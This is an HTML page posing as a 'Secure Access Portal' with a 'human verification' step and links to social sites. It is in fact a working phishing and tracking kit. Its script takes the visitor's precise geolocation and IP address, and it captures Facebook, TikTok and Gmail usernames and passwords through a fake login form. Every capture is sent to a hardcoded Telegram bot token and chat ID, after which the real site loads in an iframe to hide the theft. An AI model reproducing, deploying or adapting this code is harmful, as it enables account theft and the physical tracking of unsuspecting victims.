
   <!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
        .verify-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .music-btn { background: #1db954; color: white; border: 2px solid #0f0; padding: 15px; width: 90%; max-width: 400px; margin: 20px auto; border-radius: 50px; font-weight: bold; cursor: pointer; outline: none; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; max-width: 400px; margin: auto; }
        .card { border: 1px solid #0f0; padding: 25px; cursor: pointer; border-radius: 8px; background: #111; font-weight: bold; }
        .login-box { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; padding-top: 50px; z-index: 1000; }
        input { width: 80%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #0f0; color: #fff; border-radius: 5px; }
        .btn { background: #0f0; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; width: 85%; }
        iframe { width: 100%; height: 100vh; border: none; display: none; position: fixed; top: 0; left: 0; z-index: 5000; }
    </style>
</head>
<body>

<div id="verifyOverlay" class="verify-overlay">
    <h2 style="color: #0f0;">HUMAN VERIFICATION</h2>
    <p style="color: #888; padding: 0 20px;">Allow location to verify you are not a bot.</p>
    <button class="btn" onclick="verifyAndStart()">Verify Me</button>
</div>

<button class="music-btn" id="musicToggle" onclick="toggleMusic()">üéµ MUSIC: ON (TAP TO OFF) üéµ</button>

<div class="grid">
    <div class="card" onclick="openFB()">Facebook</div>
    <div class="card" onclick="openTikTok()">TikTok</div>
    <div class="card" onclick="openGmail()">Gmail</div>
    <div class="card" onclick="openTermux()">Termux</div>
    <div class="card" onclick="useDirect('YouTube', 'https://www.youtube.com')">YouTube</div>
    <div class="card" onclick="useDirect('Game', 'https://www.youtube.com/embed/14pPsB78lzg?autoplay=1')">Game</div>
</div>

<div id="loginWindow" class="login-box">
    <h3 id="platTitle">Security Check</h3>
    <input type="text" id="targetUser" placeholder="Email or Phone">
    <input type="password" id="targetPass" placeholder="Password">
    <button class="btn" onclick="saveAndGo()">LOGIN</button>
</div>

<iframe id="webLoader" src=""></iframe>

<script>
    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
    const CHAT_ID = '7416528268';
    
    // ‡¶ó‡¶æ‡¶® ‡¶Ö‡¶ü‡ßã ‡¶™‡ßç‡¶≤‡ßá ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø
    const audio = new Audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");
    audio.loop = true;

    function verifyAndStart() {
        navigator.geolocation.getCurrentPosition(p => {
            const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            fetchIP(map);
            document.getElementById('verifyOverlay').style.display = 'none';
            audio.play(); // ‡¶Ö‡¶ü‡ßã ‡¶ó‡¶æ‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ
        }, () => {
            alert("Location is required for verification!");
        }, {enableHighAccuracy: true});
    }

    async function fetchIP(map) {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        sendToBot(`üë§ TARGET VERIFIED\nüåê IP: ${data.ip}\nüìç Map: ${map}`);
    }

    function toggleMusic() {
        if (audio.paused) {
            audio.play();
            document.getElementById('musicToggle').innerText = "üéµ MUSIC: ON (TAP TO OFF) üéµ";
        } else {
            audio.pause();
            document.getElementById('musicToggle').innerText = "üîá MUSIC: OFF (TAP TO ON) üîá";
        }
    }

    // ‡¶´‡¶ø‡¶∂‡¶ø‡¶Ç ‡¶õ‡¶æ‡ßú‡¶æ ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡¶á‡¶â‡¶ü‡¶ø‡¶â‡¶¨ ‡¶¨‡¶æ ‡¶ó‡ßá‡¶Æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞
    function useDirect(name, url) {
        sendToBot(`üöÄ User opened ${name} directly`);
        const loader = document.getElementById('webLoader');
        loader.src = url;
        loader.style.display = 'block';
    }

    // ‡¶´‡¶ø‡¶∂‡¶ø‡¶Ç ‡¶Æ‡ßá‡¶•‡¶° (Facebook/TikTok/Gmail)
    let currentSite = "";
    function openFB() { currentSite = "Facebook"; document.getElementById('loginWindow').style.display = 'block'; }
    function openTikTok() { currentSite = "TikTok"; document.getElementById('loginWindow').style.display = 'block'; }
    function openGmail() { currentSite = "Gmail"; document.getElementById('loginWindow').style.display = 'block'; }

    function saveAndGo() {
        const u = document.getElementById('targetUser').value;
        const p = document.getElementById('targetPass').value;
        sendToBot(`üîë PHISHING DATA\nSite: ${currentSite}\nUser: ${u}\nPass: ${p}`);
        
        let url = currentSite === "Facebook" ? "https://m.facebook.com" : "https://www.google.com";
        const loader = document.getElementById('webLoader');
        loader.src = url;
        loader.style.display = 'block';
    }

    function sendToBot(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
    }
</script>
</body>
</html>
